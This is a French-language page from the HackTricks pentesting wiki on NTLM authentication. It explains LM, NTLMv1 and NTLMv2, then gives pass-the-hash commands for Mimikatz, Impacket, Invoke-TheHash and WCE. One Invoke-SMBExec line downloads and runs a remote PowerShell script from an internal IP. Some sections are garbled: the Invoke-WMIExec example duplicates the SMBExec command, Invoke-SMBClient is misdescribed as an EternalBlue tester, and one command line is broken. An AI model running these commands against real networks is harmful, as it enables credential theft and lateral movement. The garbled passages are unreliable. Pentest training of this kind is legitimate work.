# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de cybersécurité ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

**Identifiants NTLM** : Nom de domaine (le cas échéant), nom d'utilisateur et hachage de mot de passe.

**LM** n'est activé que dans **Windows XP et Server 2003** (les hachages LM peuvent être craqués). Le hachage LM AAD3B435B51404EEAAD3B435B51404EE signifie que LM n'est pas utilisé (c'est le hachage LM de la chaîne vide).

Par défaut, **Kerberos** est utilisé, donc NTLM ne sera utilisé que s'il n'y a pas de **Active Directory configuré**, que le **domaine n'existe pas**, que **Kerberos ne fonctionne pas** (mauvaise configuration) ou que le **client** qui essaie de se connecter utilise l'adresse IP au lieu d'un nom d'hôte valide.

Les **paquets réseau** d'une **authentification NTLM** ont l'en-tête "**NTLMSSP**".

Les protocoles : LM, NTLMv1 et NTLMv2 sont pris en charge dans la DLL %windir%\Windows\System32\msv1\_0.dll

## LM, NTLMv1 et NTLMv2

Vous pouvez vérifier et configurer le protocole qui sera utilisé :

### GUI

Exécutez _secpol.msc_ -> Stratégies locales -> Options de sécurité -> Sécurité réseau : Niveau d'authentification LAN Manager. Il y a 6 niveaux (de 0 à 5).

![](<../../.gitbook/assets/image (92).png>)

### Registre

Cela définira le niveau 5 :
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valeurs possibles :
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Schéma d'authentification de base NTLM Domain

1. L'utilisateur introduit ses identifiants
2. La machine cliente envoie une demande d'authentification en envoyant le nom de domaine et le nom d'utilisateur
3. Le serveur envoie le défi
4. Le client chiffre le défi en utilisant le hachage du mot de passe comme clé et l'envoie en réponse
5. Le serveur envoie au contrôleur de domaine le nom de domaine, le nom d'utilisateur, le défi et la réponse. Si aucun Active Directory n'est configuré ou si le nom de domaine est le nom du serveur, les identifiants sont vérifiés localement.
6. Le contrôleur de domaine vérifie si tout est correct et envoie les informations au serveur.

Le serveur et le contrôleur de domaine sont capables de créer un canal sécurisé via le serveur Netlogon car le contrôleur de domaine connaît le mot de passe du serveur (il est dans la base de données NTDS.DIT).

### Schéma d'authentification NTLM local

L'authentification est comme celle mentionnée précédemment, mais le serveur connaît le hachage de l'utilisateur qui tente de s'authentifier dans le fichier SAM. Ainsi, au lieu de demander au contrôleur de domaine, le serveur vérifiera lui-même si l'utilisateur peut s'authentifier.

### Défi NTLMv1

La longueur du défi est de 8 octets et la réponse est longue de 24 octets.

Le hachage NT (16 octets) est divisé en 3 parties de 7 octets chacune (7B + 7B + (2B+0x00\*5)): la dernière partie est remplie de zéros. Ensuite, le défi est chiffré séparément avec chaque partie et les octets chiffrés résultants sont joints. Total : 8B + 8B + 8B = 24 octets.

Problèmes :

* Manque de randomisation
* Les 3 parties peuvent être attaquées séparément pour trouver le hachage NT
* DES est crackable
* La 3ème clé est composée de 5 zéros.
* Étant donné le même défi, la réponse sera identique. Ainsi, vous pouvez donner comme défi à la victime la chaîne "1122334455667788" et attaquer la réponse utilisant des tables arc-en-ciel précalculées.

### Attaque NTLMv1

De nos jours, il est de moins en moins courant de trouver des environnements avec une délégation non contrainte configurée, mais cela ne signifie pas que vous ne pouvez pas abuser d'un service de spouleur d'impression configuré.

Vous pourriez abuser de certaines informations d'identification/sessions que vous avez déjà sur l'AD pour demander à l'imprimante de s'authentifier contre un hôte sous votre contrôle. Ensuite, en utilisant `metasploit auxiliary/server/capture/smb` ou `responder`, vous pouvez définir le défi d'authentification sur 1122334455667788, capturer la tentative d'authentification et si elle a été effectuée en utilisant NTLMv1, vous pourrez la craquer. Si vous utilisez `responder`, vous pourriez essayer d'utiliser le drapeau `--lm` pour essayer de rétrograder l'authentification. Notez que pour cette technique, l'authentification doit être effectuée en utilisant NTLMv1 (NTLMv2 n'est pas valide).

N'oubliez pas que l'imprimante utilisera le compte d'ordinateur lors de l'authentification, et les comptes d'ordinateur utilisent des mots de passe longs et aléatoires que vous ne pourrez probablement pas craquer en utilisant des dictionnaires courants. Mais l'authentification NTLMv1 utilise DES (plus d'informations ici), donc en utilisant des services spécialement dédiés au craquage de DES, vous pourrez la craquer (vous pourriez utiliser https://crack.sh/ par exemple).

### Défi NTLMv2

La longueur du défi est de 8 octets et 2 réponses sont envoyées : l'une est longue de 24 octets et la longueur de l'autre est variable.

La première réponse est créée en chiffrant en utilisant HMAC_MD5 la chaîne composée du client et du domaine et en utilisant comme clé le hachage MD4 du hachage NT. Ensuite, le résultat sera utilisé comme clé pour chiffrer en utilisant HMAC_MD5 le défi. Pour cela, un défi client de 8 octets sera ajouté. Total : 24 B.

La deuxième réponse est créée en utilisant plusieurs valeurs (un nouveau défi client, une horodatage pour éviter les attaques de rejeu...).

Si vous avez un pcap qui a capturé un processus d'authentification réussi, vous pouvez suivre ce guide pour obtenir le nom de domaine, le nom d'utilisateur, le défi et la réponse et essayer de craquer le mot de passe : https://research.801labs.org/cracking-an-ntlmv2-hash/

## Pass-the-Hash

Une fois que vous avez le hachage de la victime, vous pouvez l'utiliser pour vous faire passer pour elle. Vous devez utiliser un outil qui effectuera l'authentification NTLM en utilisant ce hachage, ou vous pourriez créer une nouvelle session de connexion et injecter ce hachage dans le LSASS, de sorte que lorsque toute authentification NTLM est effectuée, ce hachage sera utilisé. La dernière option est ce que fait Mimikatz.

Veuillez noter que vous pouvez également effectuer des attaques Pass-the-Hash en utilisant des comptes d'ordinateur.

### Mimikatz

Doit être exécuté en tant qu'administrateur.
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' 
```
Cela lancera un processus qui appartiendra aux utilisateurs qui ont lancé mimikatz mais internement dans LSASS, les informations d'identification enregistrées sont celles à l'intérieur des paramètres de mimikatz. Ensuite, vous pouvez accéder aux ressources réseau comme si vous étiez cet utilisateur (similaire à l'astuce `runas /netonly` mais vous n'avez pas besoin de connaître le mot de passe en texte clair).

### Pass-the-Hash depuis Linux

Vous pouvez obtenir l'exécution de code sur des machines Windows en utilisant Pass-the-Hash depuis Linux.\
[**Accédez ici pour apprendre comment le faire.**](../../windows/ntlm/broken-reference/)

### Outils compilés pour Windows Impacket

Vous pouvez télécharger les binaires d'impacket pour Windows ici: (https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Dans ce cas, vous devez spécifier une commande, cmd.exe et powershell.exe ne sont pas valides pour obtenir un shell interactif)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Il y a plusieurs autres binaires Impacket...

### Invoke-TheHash

Vous pouvez obtenir les scripts PowerShell ici: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

Invoke-WMIExec est un script PowerShell qui permet d'exécuter des commandes sur des machines distantes en utilisant WMI (Windows Management Instrumentation). Il peut être utilisé pour exécuter des commandes sur des machines distantes sans avoir besoin d'installer un agent ou un service sur la machine cible. Cela peut être utile pour les tests de pénétration ou pour l'administration à distance.
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

Le module Invoke-SMBClient est un outil PowerShell qui permet de se connecter à un partage SMB distant et d'exécuter des commandes sur ce partage. Il peut être utilisé pour tester la vulnérabilité CVE-2017-0144 (EternalBlue) qui permet l'exécution de code à distance sur des systèmes Windows non patchés. 

La syntaxe de base est la suivante :

```
Invoke-SMBClient -Target <cible> -Command <commande>
```

Où `<cible>` est l'adresse IP ou le nom d'hôte de la machine cible et `<commande>` est la commande à exécuter sur le partage SMB distant. 

Par exemple, pour exécuter la commande `ipconfig` sur la machine cible `192.168.1.100`, on peut utiliser la commande suivante :

```
Invoke-SMBClient -Target 192.168.1.100 -Command "ipconfig"
```
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

La commande Invoke-SMBEnum est un outil de reconnaissance qui permet de collecter des informations sur les partages SMB d'une machine cible. Elle peut être utilisée pour identifier les partages SMB accessibles, les utilisateurs connectés, les sessions ouvertes et les fichiers ouverts. Cette commande est souvent utilisée dans les étapes de reconnaissance d'une attaque de type "Pass-the-Hash".
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Cette fonction est un **mélange de toutes les autres**. Vous pouvez passer **plusieurs hôtes**, **exclure** certains et **sélectionner** l'**option** que vous souhaitez utiliser (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si vous sélectionnez **l'un** des **SMBExec** et **WMIExec** mais que vous ne donnez pas de paramètre _**Command**_, il vérifiera simplement si vous avez **suffisamment de permissions**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#utilisation-d-evil-winrm)

### Éditeur de crédentials Windows (WCE)

**Doit être exécuté en tant qu'administrateur**

Cet outil fera la même chose que mimikatz (modifier la mémoire LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Exécution manuelle à distance sur Windows avec nom d'utilisateur et mot de passe

{% content-ref url="../lateral-movement/" %}
[mouvement latéral](../lateral-movement/)
{% endcontent-ref %}

## Extraction de crédentials à partir d'un hôte Windows

**Pour plus d'informations sur** [**comment obtenir des crédentials à partir d'un hôte Windows, vous devriez lire cette page**](broken-reference)**.**

## NTLM Relay et Responder

**Lisez un guide plus détaillé sur la façon de réaliser ces attaques ici:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Analyse des défis NTLM à partir d'une capture réseau

**Vous pouvez utiliser** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
